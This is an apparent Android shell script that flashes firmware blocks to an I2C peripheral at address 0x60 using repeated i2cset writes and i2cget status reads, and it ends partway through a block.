/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x3 0x3f 0x72 0x7c 0x1e 0x89 0x6 0x72 0x19 0xe 0x73 0x0 0x83 0xad i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x54 0x51 0x72 0x13 0x5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x52 0x4 0x31 0x80 0x53 0x68 0x51 0x73 0x31 0x80 0x1a 0x68 0xd0 0x1b 0x7c 0x1e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x89 0x52 0x5 0x12 0x72 0x53 0x72 0x52 0x4 0x1a 0x73 0x53 0x73 0x7c 0x1d 0xed i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x6 0x70 0x8f 0x7c 0x1e 0x10 0x80 0x21 0x62 0xd0 0x0 0x7c 0x1d 0x97 0x6 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x8f 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 0x50 0x0 0x3f 0x72 0xa5 0xf2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x55 0x50 0x19 0x3f 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x80 0x7 0x7c 0x1d 0xb9 0x7c 0x1e 0x3b 0x7c 0x1d 0xc4 0x81 0xa8 0x52 0x0 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x52 0x1 0x8 0x52 0x2 0x8 0x52 0x3 0x8 0x50 0x0 0x8 0x8 0x8 0x50 0x3f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x8 0x62 0xd0 0x0 0x7c 0x1c 0xa4 0x38 0xfc 0x18 0x54 0x3 0x18 0x54 0x2 0x18 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x54 0x1 0x18 0x97 0x77 0x40 0x7c 0x1d 0x97 0x6 0x72 0x81 0x36 0x15 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x56 0x97 0xd4 0x40 0x7c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1d 0xf9 0x7c 0x1d 0x97 0x6 0x72 0x8f 0x97 0xc8 0x40 0x7c 0x1e 0x94 0xd0 0x18 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x52 0xfc 0x53 0x72 0x55 0x73 0x0 0x6 0x72 0x9e 0xe 0x73 0x0 0x51 0x73 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd5 0x50 0x4 0x3f 0x72 0x80 0x12 0x7c 0x1d 0xb9 0x6 0x72 0x9e 0xe 0x73 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x51 0x73 0x60 0xd5 0x50 0x3 0x3f 0x72 0x7c 0x1d 0xc4 0x81 0xef 0x88 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x57 0x38 0x62 0xd0 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x97 0xd1 0x40 0x6 0x72 0x81 0x97 0x8a 0x40 0x7c 0x1d 0xf9 0x97 0xc5 0x40 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x72 0x8f 0x97 0x7e 0x40 0x7c 0x1e 0x94 0xd0 0xff 0x97 0xb7 0x40 0x51 0x72 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x8d 0x53 0x70 0x51 0x73 0x9 0x0 0x7c 0x1e 0x4a 0x6 0x72 0x85 0x97 0x63 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x53 0x72 0x51 0x70 0x12 0x72 0x51 0x71 0x1a 0x73 0xd0 0x60 0x6 0xb7 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x58 0x52 0x0 0x8 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1 0x8 0x52 0x2 0x8 0x52 0x3 0x8 0x50 0x0 0x8 0x8 0x8 0x50 0x30 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x7c 0x1c 0xa4 0x38 0xfc 0x18 0x54 0x3 0x18 0x54 0x2 0x18 0x54 0x1 0x18 0x54 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x97 0x70 0x40 0x6 0x72 0x8d 0x97 0x29 0x40 0x53 0x70 0x51 0x73 0x53 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x55 0x72 0x0 0x55 0x73 0x0 0x50 0x4 0x62 0xd0 0x0 0x65 0x95 0xd6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x59 0x70 0x6b 0x71 0x6b i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x72 0x6b 0x73 0x78 0xbf 0xf3 0x51 0x70 0x5 0x3 0x51 0x71 0xd 0x2 0x51 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xd 0x1 0x51 0x73 0xd 0x0 0x97 0x8 0x40 0x80 0x2a 0x52 0x0 0x8 0x52 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x8 0x52 0x2 0x8 0x52 0x3 0x8 0x50 0x0 0x8 0x8 0x8 0x50 0x3f 0x8 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xd0 0x0 0x7c 0x1c 0xa4 0x38 0xfc 0x18 0x54 0x3 0x18 0x54 0xe0 0x6d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5a 0x2 0x18 0x54 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x18 0x96 0x69 0x40 0x62 0xd0 0x0 0x97 0xa 0x40 0x6 0x72 0x81 0x96 0xc3 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x53 0x70 0x51 0x73 0x53 0x71 0x52 0x3 0x12 0x70 0x53 0x70 0x52 0x2 0x1a 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x53 0x71 0x51 0x70 0x53 0x72 0x51 0x71 0x53 0x73 0x51 0x72 0x54 0x5 0x51 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x54 0x4 0x51 0x12 0x97 0xc0 0x40 0xd0 0x18 0x52 0xfc 0x53 0xbc 0x26 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5b 0x72 0x55 0x73 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x6 0x72 0x9e 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 0x50 0x4 0x3f 0x72 0x80 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x96 0xe3 0x40 0x97 0x62 0x40 0x80 0x12 0x96 0xdb 0x40 0x6 0x72 0x9e 0xe 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x51 0x73 0x60 0xd5 0x50 0x3 0x3f 0x72 0x96 0xd5 0x40 0x80 0x7 0x96 0xc5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x40 0x97 0x44 0x40 0x62 0xd0 0x0 0x96 0x9a 0x40 0x6 0x72 0x34 0x17 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5c 0x85 0x96 0x53 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x53 0x72 0x38 0xf7 0x20 0x7f 0x10 0x4f 0x38 0x2 0x56 0x1 0x0 0x80 0x5e 0x56 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x0 0x80 0x30 0x97 0x6 0x40 0x97 0x47 0x40 0x97 0x35 0x40 0x53 0x73 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x1 0x53 0x70 0x55 0x71 0x0 0x65 0x70 0x6b 0x71 0x6 0x70 0x8d 0xe 0x71 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x51 0x71 0x97 0x12 0x40 0x51 0x73 0x60 0xd5 0x51 0x71 0x3f 0x96 0xdc i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5d 0x72 0x51 0x70 0x3f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x72 0x77 0x0 0x3d 0x0 0x4 0xcf 0xcd 0x96 0xd2 0x40 0x51 0x72 0x1 0x8d 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x70 0x51 0x73 0x9 0x0 0x96 0xef 0x40 0x6 0x72 0x93 0xe 0x73 0x0 0x51 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x60 0xd5 0x51 0x71 0x3f 0x72 0x51 0x70 0x3f 0x72 0x77 0x1 0x3d 0x1 0x1 0xcf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x9f 0x38 0xfe 0x20 0x7f 0x10 0x4f 0x38 0x6 0x62 0xd0 0x0 0xb9 0x23 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5e 0x55 0x72 0x0 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x73 0xa 0x5a 0x70 0x6 0x70 0x1 0x62 0xd5 0x3 0x10 0x55 0x68 0x0 0x51 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x58 0x72 0x8 0x28 0x62 0xd0 0x0 0x3f 0x70 0x18 0x75 0x9 0x0 0x76 0x68 0x3c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x68 0x4 0xbf 0xef 0x20 0x56 0x0 0x0 0x80 0x42 0x62 0xd0 0x0 0x95 0xe4 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x96 0xae 0x40 0x6 0x70 0x1 0xe 0x71 0x0 0x65 0x70 0x6b 0x27 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x5f 0x71 0x51 0x72 0x4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x70 0x51 0x73 0xc 0x71 0x51 0x71 0x96 0x7d 0x40 0x52 0x0 0x53 0x6e 0x55 0x6f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x65 0x6e 0x6b 0x6f 0x51 0x6e 0x2 0x72 0x53 0x72 0x51 0x6f 0xa 0x73 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xd5 0x51 0x71 0x3f 0x72 0x51 0x70 0x3f 0x72 0x77 0x0 0x3d 0x0 0x3 0xcf 0xbb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0xd0 0x0 0x95 0x9e 0x40 0x6 0x72 0x8d 0x95 0x57 0x40 0xe8 0x83 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x60 0x53 0x72 0x95 0xe9 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x40 0x65 0x70 0x6b 0x71 0x65 0x70 0x6b 0x71 0x6 0x70 0x7a 0x95 0xfe 0x40 0x56 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x0 0x80 0x8f 0x62 0xd0 0x0 0x55 0x73 0x3 0x5a 0x72 0x6 0x72 0x1 0x95 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xc8 0x40 0x96 0x2d 0x40 0x53 0x73 0x95 0xc0 0x40 0x65 0x70 0x6b 0x71 0x65 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x6b 0x71 0x6 0x70 0x74 0xe 0x71 0x0 0x52 0x0 0x53 0x6e 0x28 0x4 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x61 0x55 0x6f 0x0 0x65 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x6e 0x6b 0x6f 0x51 0x6e 0x2 0x70 0x53 0x70 0x51 0x6f 0xa 0x71 0x60 0xd4 0x3e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x70 0x53 0x71 0x3e 0x70 0x53 0x6c 0x51 0x71 0x53 0x6d 0x55 0x6e 0x0 0x55 0x6f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x51 0x73 0x60 0xd4 0x3e 0x72 0x53 0x6b 0x3e 0x72 0x53 0x6a 0x3e 0x72 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x69 0x3e 0x72 0x16 0x72 0x4 0x2 0x6c 0x53 0x6c 0x51 0x69 0x1e 0xf1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x62 0xa 0x6d 0x53 0x6d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x51 0x6a 0xa 0x6e 0x53 0x6e 0x51 0x6b 0xa 0x6f 0x53 0x6f 0x51 0x73 0x60 0xd5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0x6f 0x3f 0x72 0x51 0x6e 0x3f 0x72 0x51 0x6d 0x3f 0x72 0x51 0x6c 0x3f 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x77 0x0 0x3d 0x0 0x4 0xcf 0x6e 0x62 0xd0 0x0 0x55 0x73 0x3 0x5a 0x72 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x72 0x1 0x95 0x35 0x40 0x95 0x9a 0x40 0x60 0xd4 0x3e 0x72 0x6d 0x90 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x63 0x53 0x6f 0x3e 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x53 0x6e 0x3e 0x72 0x53 0x6d 0x3e 0x72 0x53 0x6c 0x51 0x6f 0x8 0x51 0x6e 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0x6d 0x8 0x51 0x6c 0x53 0x70 0x18 0x53 0x71 0x18 0x53 0x72 0x18 0x53 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x50 0x2 0x70 0xfb 0x62 0xd0 0x0 0x6e 0x73 0x6e 0x72 0x6e 0x71 0x6e 0x70 0x78 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xbf 0xf1 0x51 0x70 0x53 0x72 0x51 0x71 0x53 0x73 0x94 0xed 0xa2 0xfb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x64 0x40 0x6 0x70 0x93 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x95 0xa 0x40 0x38 0xfa 0x20 0x7f 0x10 0x4f 0x38 0x4 0x56 0x3 0x0 0x56 0x2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x80 0x1d 0x56 0x1 0x0 0x56 0x0 0x0 0x80 0x6 0x77 0x1 0xf 0x0 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x52 0x1 0x11 0x22 0x52 0x0 0x19 0x0 0xcf 0xf2 0x77 0x3 0xf 0x2 0x0 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x3 0x13 0xfc 0x52 0x2 0x1b 0xfb 0xcf 0xdb 0x38 0xfc 0x20 0xa5 0x2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x65 0x7f 0x62 0xd0 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x26 0xa8 0xf7 0x51 0xa8 0x60 0x0 0x50 0x0 0x8 0x50 0x32 0x8 0x9f 0xb8 0x38 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xfe 0x62 0xd0 0x0 0x2e 0xa8 0x8 0x51 0xa8 0x60 0x0 0x7f 0x10 0x7c 0xc 0x76 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x20 0x62 0xd0 0x0 0x53 0x73 0x47 0x73 0x10 0xa0 0xf 0x51 0x9c 0x3a 0x40 0xa0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x9 0x3c 0x40 0x0 0xa0 0x4 0x7c 0x0 0x7c 0x7f 0x10 0x4f 0xcb 0x4f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x66 0x38 0x5 0x62 0xd0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x55 0x44 0x3f 0x55 0x46 0x56 0x55 0x3f 0x30 0x55 0x7d 0xc8 0x55 0x47 0x1e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x55 0xa0 0x0 0x55 0xa2 0x0 0x55 0x43 0x1 0x55 0x42 0x3c 0x55 0x3e 0x0 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x1 0x10 0x50 0x0 0x8 0x50 0x3e 0x8 0x50 0x13 0x8 0x50 0x28 0x8 0x7c 0xc i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x92 0x38 0xfc 0x7c 0xc 0x40 0x7c 0xf 0x8 0x7c 0xe 0x1a 0xe3 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x67 0x20 0x56 0x2 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x80 0x24 0x10 0x52 0x2 0x7c 0x11 0x9c 0x20 0x62 0xd0 0x0 0x53 0x73 0x52 0x2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x53 0x70 0x55 0x71 0x0 0x6 0x70 0x5e 0xe 0x71 0x0 0x51 0x71 0x60 0xd5 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x73 0x3f 0x70 0x77 0x2 0x3d 0x2 0x1 0xcf 0xd9 0x9f 0x51 0x82 0xac 0x62 0xd0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x51 0x3e 0x53 0xa6 0x51 0x5d 0x53 0xa1 0x56 0x0 0x0 0x8c 0xd3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x68 0x80 0xa 0x10 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x7c 0x10 0xd1 0x20 0x77 0x0 0x3d 0x0 0x1 0xcf 0xf3 0x62 0xd0 0x0 0x3c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x47 0x0 0xb0 0x6 0x3c 0xa0 0x0 0xa0 0x42 0x62 0xd0 0x0 0x3c 0x47 0x0 0xa0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x2c 0x7a 0x47 0x56 0x1 0x0 0x80 0x1e 0x93 0xf2 0x40 0x51 0x72 0x1 0x8d 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x70 0x51 0x73 0x9 0x0 0x94 0xf 0x40 0x94 0x61 0x40 0x51 0x4f 0x5a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x69 0x71 0x3f 0x72 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x70 0x3f 0x72 0x77 0x1 0x3d 0x1 0x1 0xcf 0xdf 0x80 0x24 0x62 0xd0 0x0 0x3c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xa0 0x0 0xa0 0x1c 0x7a 0xa0 0x7a 0x47 0x80 0x16 0x62 0xd0 0x0 0x3c 0x9b 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xb0 0xe 0x51 0x82 0x8 0x51 0x81 0x53 0x99 0x18 0x53 0x9a 0x2e 0x9b 0x1 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xd0 0x0 0x51 0x8e 0x11 0x50 0x51 0x8d 0x19 0xc3 0xd0 0x4 0x7 0xcb i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6a 0x50 0x0 0x0 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xd0 0x0 0x51 0x82 0x11 0xe8 0x53 0x72 0x51 0x81 0x19 0x3 0x53 0x73 0x51 0x8e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x12 0x72 0x51 0x8d 0x1a 0x73 0xd0 0x4 0x50 0x0 0x0 0x10 0x7c 0xe 0x5d 0x7c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xe 0x44 0x20 0x39 0x0 0xa0 0xd0 0x62 0xd0 0x0 0x50 0x90 0x12 0x84 0x50 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x1a 0x83 0xd0 0x4 0x55 0xa7 0x1 0x62 0xd0 0x0 0x3c 0xa5 0xc1 0x40 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x6b 0x0 0xb0 0xc 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x8c 0x96 0x55 0x8b 0x0 0x55 0xa5 0x1 0x80 0x56 0x62 0xd0 0x0 0x3c 0x8b 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xb0 0x6 0x3c 0x8c 0x0 0xa0 0xb 0x62 0xd0 0x0 0x7a 0x8c 0x1e 0x8b 0x0 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x3f 0x62 0xd0 0x0 0x47 0x43 0x2 0xb0 0x37 0x50 0x98 0x12 0x84 0x50 0x8 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x83 0xd0 0x2d 0x55 0x47 0x8 0x55 0xa4 0x3 0x51 0x9a 0x1 0x47 0x4d i
